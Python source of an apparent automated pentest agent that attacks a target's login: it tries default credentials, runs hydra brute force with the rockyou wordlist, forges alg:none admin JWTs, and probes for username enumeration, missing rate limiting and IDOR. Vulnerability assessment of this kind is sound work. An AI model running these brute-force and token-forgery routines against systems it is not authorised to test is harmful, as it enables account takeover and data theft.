"""
CYPHEX — Agent 05: Authentication & Authorization Agent

Tests for auth vulnerabilities:
  - Default/weak credential brute force
  - JWT analysis and attacks (alg:none, weak secret)
  - Session management issues
  - Username enumeration via timing
  - Missing account lockout
"""

import re
import json
import base64
import shlex
from urllib.parse import quote

from agents.base_agent import BaseAgent
from models.scan import ScanContext, Vuln
from models.agent_result import AgentResult


class AuthAgent(BaseAgent):

    DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "admin123"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin@123"),
        ("root", "root"),
        ("root", "toor"),
        ("test", "test"),
        ("user", "user"),
        ("guest", "guest"),
        ("administrator", "administrator"),
        ("admin", "P@ssw0rd"),
    ]

    @staticmethod
    def _q(value: str) -> str:
        """Shell-quote untrusted values before embedding in terminal commands."""
        return shlex.quote(str(value))

    async def run(self, context: ScanContext) -> AgentResult:
        await self.log("═══ AUTHENTICATION TESTING ═══", "info")

        # ─── 1. Find login endpoints ───
        login_forms = self._find_login_forms(context)

        if not login_forms:
            await self.log("No login forms found — checking endpoints directly", "info")
            # Try common login endpoints
            for path in ["/api/login", "/login", "/auth/login", "/api/auth/login"]:
                url = f"{context.target_url.rstrip('/')}{path}"
                out = await self.terminal.run(
                    f'curl -s -o /dev/null -w "%{{http_code}}" --max-time 5 {shlex.quote(url)}'
                )
                status = out.stdout.strip().replace("'", "")
                if status not in ["404", "000"]:
                    from models.scan import FormData
                    login_forms.append(FormData(
                        action=url,
                        method="POST",
                        inputs=["username", "password"],
                    ))
                    break

        # ─── 2. Default credential testing ───
        for form in login_forms:
            await self._test_default_creds(form, context)

        # ─── 3. Hydra brute force (if available) ───
        has_hydra = await self.terminal.check_tool("hydra")
        if has_hydra and login_forms:
            await self._run_hydra(login_forms[0], context)

        # ─── 4. JWT analysis ───
        await self._analyze_jwt(context)

        # ─── 5. Username enumeration timing ───
        if login_forms:
            await self._test_username_enumeration(login_forms[0], context)

        # ─── 6. Missing rate limiting ───
        if login_forms:
            await self._test_rate_limiting(login_forms[0], context)

        # ─── 7. IDOR on user endpoints ───
        await self._test_user_idor(context)

        await self.log(
            f"Auth testing complete: {len(self.vulns)} vulnerabilities found",
            "success" if not self.vulns else "danger",
        )

        return AgentResult(
            agent="AuthAgent",
            vulns=self.vulns,
            context=context,
            terminal_logs=self.terminal.command_history,
        )

    def _find_login_forms(self, context: ScanContext):
        """Find login forms from crawler results."""
        return [
            f for f in context.all_forms
            if any(inp.lower() in ['password', 'passwd', 'pass'] for inp in f.inputs)
            or 'login' in f.action.lower()
        ]

    async def _test_default_creds(self, form, context: ScanContext):
        """Test default credentials against login form."""
        await self.log(f"Testing default credentials on {form.action}...", "info")

        username_field = next(
            (inp for inp in form.inputs if inp.lower() in [
                'username', 'user', 'email', 'login', 'name'
            ]),
            form.inputs[0] if form.inputs else "username",
        )
        password_field = next(
            (inp for inp in form.inputs if inp.lower() in [
                'password', 'passwd', 'pass', 'pwd'
            ]),
            form.inputs[1] if len(form.inputs) > 1 else "password",
        )

        for username, password in self.DEFAULT_CREDS:
            data_str = f"{username_field}={username}&{password_field}={password}"
            out = await self.terminal.run(
                f'curl -s -X POST {shlex.quote(form.action)} '
                f'-d {shlex.quote(data_str)} '
                f'-H "Content-Type: application/x-www-form-urlencoded" '
                f'--max-time 10'
            )

            response = out.stdout.lower()
            if any(kw in response for kw in [
                '"success":true', '"success": true',
                '"authenticated"', '"token"', 'welcome',
                'dashboard', 'logged in', '"user"'
            ]) and not any(kw in response for kw in [
                'invalid', 'failed', 'error', 'incorrect', 'denied'
            ]):
                await self.add_vuln(Vuln(
                    name=f"Default Credentials — {username}:{password}",
                    severity="Critical",
                    cvss_score=9.1,
                    endpoint=form.action,
                    payload=f"{username}:{password}",
                    confirmed=True,
                    evidence=out.stdout[:300],
                    description=(
                        f"Login with default credentials {username}:{password} succeeded."
                    ),
                    fix="Change all default credentials. Enforce strong password policy.",
                ))
                # Store session for other agents
                cookie_match = re.search(r'token["\s:]+["\']?([^"\'}\s]+)', out.stdout)
                if cookie_match:
                    context.session_cookie = cookie_match.group(1)
                break

    async def _run_hydra(self, form, context: ScanContext):
        """Run hydra for brute force testing."""
        from urllib.parse import urlparse
        parsed = urlparse(form.action)

        await self.log("Running hydra brute force...", "info")
        # Build the hydra "path:params:condition" argument as a single token
        # before quoting — hydra expects it as one positional argument.
        hydra_form_arg = f"{parsed.path}:username=^USER^&password=^PASS^:Invalid"
        out = await self.terminal.run(
            f"hydra -l admin -P /usr/share/wordlists/rockyou.txt "
            f"-s {shlex.quote(str(parsed.port or 80))} "
            f"{shlex.quote(parsed.hostname or '')} http-post-form "
            f"{shlex.quote(hydra_form_arg)} "
            f"-t 16 -I -f -V",
            timeout=60,
        )

        if "host:" in out.stdout.lower() and "password:" in out.stdout.lower():
            # Extract found credentials
            cred_match = re.search(
                r'login:\s*(\S+)\s+password:\s*(\S+)', out.stdout
            )
            if cred_match:
                await self.add_vuln(Vuln(
                    name=f"Weak Password (hydra cracked)",
                    severity="Critical",
                    cvss_score=9.1,
                    endpoint=form.action,
                    payload=f"{cred_match.group(1)}:{cred_match.group(2)}",
                    confirmed=True,
                    evidence=out.stdout[:300],
                    fix="Enforce strong passwords. Implement account lockout.",
                ))

    async def _analyze_jwt(self, context: ScanContext):
        """Analyze JWT tokens found in cookies or responses."""
        await self.log("Analyzing JWT tokens...", "info")

        jwt_candidates = []

        # Check cookies
        for name, value in context.all_cookies.items():
            if self._looks_like_jwt(value):
                jwt_candidates.append((name, value, "cookie"))

        # Check if session_cookie is JWT
        if context.session_cookie and self._looks_like_jwt(context.session_cookie):
            jwt_candidates.append(("token", context.session_cookie, "session"))

        for name, token, source in jwt_candidates:
            await self.log(f"JWT found in {source}: {name}", "warning")

            # Decode header and payload
            try:
                parts = token.split(".")
                if len(parts) >= 2:
                    # Decode header
                    header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
                    header = json.loads(base64.b64decode(header_b64))
                    # Log only non-sensitive structure (alg/typ), never the
                    # full decoded header, to avoid leaking token internals.
                    await self.log(
                        f"  JWT Header: alg={header.get('alg')!r} "
                        f"typ={header.get('typ')!r}",
                        "info",
                    )

                    # Decode payload
                    payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
                    payload = json.loads(base64.b64decode(payload_b64))
                    # Log only claim KEYS, never claim values (may contain
                    # PII, session identifiers, or other secrets).
                    await self.log(
                        f"  JWT Payload claims present: {sorted(payload.keys())}",
                        "warning",
                    )

                    # Check for weak algorithm
                    if header.get("alg") in ["none", "None", "NONE"]:
                        await self.add_vuln(Vuln(
                            name="JWT None Algorithm",
                            severity="Critical",
                            cvss_score=9.8,
                            confirmed=True,
                            payload=token,
                            fix="Enforce strong algorithm (RS256 or ES256).",
                        ))

                    if header.get("alg") == "HS256":
                        await self.log("  Testing weak JWT secrets...", "info")
                        # Try alg:none attack
                        await self._test_jwt_alg_none(token, context)

            except Exception as e:
                await self.log(f"  JWT decode error: {e}", "warning")

    async def _test_jwt_alg_none(self, token: str, context: ScanContext):
        """Test JWT algorithm none attack."""
        # Create forged token with alg:none
        forged_header = base64.b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).decode().rstrip("=")
        forged_payload = base64.b64encode(
            json.dumps({"user": "admin", "role": "admin", "is_admin": True}).encode()
        ).decode().rstrip("=")
        forged_token = f"{forged_header}.{forged_payload}."

        # Test forged token against protected endpoints
        for path in ["/api/admin", "/admin", "/api/users", "/dashboard"]:
            url = f"{context.target_url.rstrip('/')}{path}"
            auth_header = f"Authorization: Bearer {forged_token}"
            out = await self.terminal.run(
                f'curl -s '
                f'-H {shlex.quote(auth_header)} '
                f'--max-time 10 {shlex.quote(url)}'
            )

            if out.stdout and any(kw in out.stdout.lower() for kw in [
                'admin', 'user', 'dashboard', 'success', 'data'
            ]):
                await self.add_vuln(Vuln(
                    name="JWT Algorithm None Attack",
                    severity="Critical",
                    cvss_score=9.1,
                    endpoint=url,
                    payload=forged_token,
                    confirmed=True,
                    evidence=out.stdout[:300],
                    fix="Reject 'none' algorithm. Use asymmetric signing (RS256).",
                ))
                break

    async def _test_username_enumeration(self, form, context: ScanContext):
        """Test for username enumeration via response differences."""
        await self.log("Testing username enumeration...", "info")

        username_field = next(
            (inp for inp in form.inputs if inp.lower() in ['username', 'user', 'email']),
            form.inputs[0] if form.inputs else "username",
        )
        password_field = next(
            (inp for inp in form.inputs if inp.lower() in ['password', 'passwd', 'pass']),
            form.inputs[1] if len(form.inputs) > 1 else "password",
        )

        responses = {}
        test_users = ["admin", "administrator", "root", "nonexistent_xyz_999"]

        for user in test_users:
            data_str = f"{username_field}={user}&{password_field}=wrongpass123"
            out = await self.terminal.run(
                f'curl -s -X POST {shlex.quote(form.action)} '
                f'-d {shlex.quote(data_str)} '
                f'-w "\\n__TIME__%{{time_total}}" '
                f'--max-time 10'
            )
            body = out.stdout
            time_val = 0
            if "__TIME__" in body:
                parts = body.rsplit("__TIME__", 1)
                body = parts[0]
                try:
                    time_val = float(parts[1].strip())
                except ValueError:
                    pass
            responses[user] = {"body": body, "time": time_val, "length": len(body)}

        # Check if responses differ (indicating username enumeration)
        if responses.get("nonexistent_xyz_999") and responses.get("admin"):
            admin_resp = responses["admin"]
            nonexist_resp = responses["nonexistent_xyz_999"]

            if admin_resp["body"] != nonexist_resp["body"]:
                await self.add_vuln(Vuln(
                    name="Username Enumeration",
                    severity="Medium",
                    cvss_score=5.3,
                    endpoint=form.action,
                    confirmed=True,
                    description="Different responses for valid vs invalid usernames.",
                    fix="Use generic error messages for all login failures.",
                ))

    async def _test_rate_limiting(self, form, context: ScanContext):
        """Test if login endpoint has rate limiting."""
        await self.log("Testing rate limiting...", "info")

        username_field = form.inputs[0] if form.inputs else "username"
        password_field = form.inputs[1] if len(form.inputs) > 1 else "password"

        # Send 10 rapid requests
        blocked = False
        for i in range(10):
            data_str = f"{username_field}=admin&{password_field}=wrong{i}"
            out = await self.terminal.run(
                f'curl -s -o /dev/null -w "%{{http_code}}" '
                f'-X POST {shlex.quote(form.action)} '
                f'-d {shlex.quote(data_str)} '
                f'--max-time 5'
            )
            status = out.stdout.strip().replace("'", "")
            if status in ["429", "403"]:
                blocked = True
                break

        if not blocked:
            await self.add_vuln(Vuln(
                name="Missing Rate Limiting on Login",
                severity="Medium",
                cvss_score=5.5,
                endpoint=form.action,
                confirmed=True,
                description="Login endpoint allows unlimited attempts — brute force possible.",
                fix="Implement rate limiting (5 attempts/min). Add CAPTCHA after failures.",
            ))

    async def _test_user_idor(self, context: ScanContext):
        """Test for IDOR on user endpoints."""
        await self.log("Testing IDOR on user endpoints...", "info")

        for path_template in ["/api/user/{id}", "/api/users/{id}", "/user/{id}"]:
            for test_id in [1, 2, 3]:
                path = path_template.replace("{id}", str(test_id))
                url = f"{context.target_url.rstrip('/')}{path}"
                url_q = self._q(url)
                out = await self.terminal.run(
                    f'curl -s -w "\\n__STATUS__%{{http_code}}" --max-time 5 {shlex.quote(url)}'
                )

                body = out.stdout
                status = "000"
                if "__STATUS__" in body:
                    parts = body.rsplit("__STATUS__", 1)
                    body = parts[0]
                    status = parts[1].strip()

                # MUST be HTTP 200 — reject 404/302 to avoid false positives
                if status != "200":
                    continue

                if body and len(body.strip()) > 20:
                    lower = body.lower()
                    # Must NOT contain generic error pages
                    if "cannot get" in lower or "not found" in lower:
                        continue
                    if any(kw in lower for kw in [
                        '"username"', '"email"', '"password"', '"role"',
                    ]):
                        await self.add_vuln(Vuln(
                            name=f"IDOR -- Unauthorized User Data Access",
                            severity="High",
                            cvss_score=8.1,
                            endpoint=url,
                            confirmed=True,
                            evidence=body[:300],
                            dumped_data=body[:200],
                            description=f"User data accessible at {url} without authorization (HTTP {status}).",
                            fix="Implement proper authorization checks on all user endpoints.",
                        ))
                        return  # Found, no need to test more

    def _looks_like_jwt(self, value: str) -> bool:
        """Check if a string looks like a JWT."""
        parts = value.split(".")
        return len(parts) == 3 and len(parts[0]) > 10 and len(parts[1]) > 10
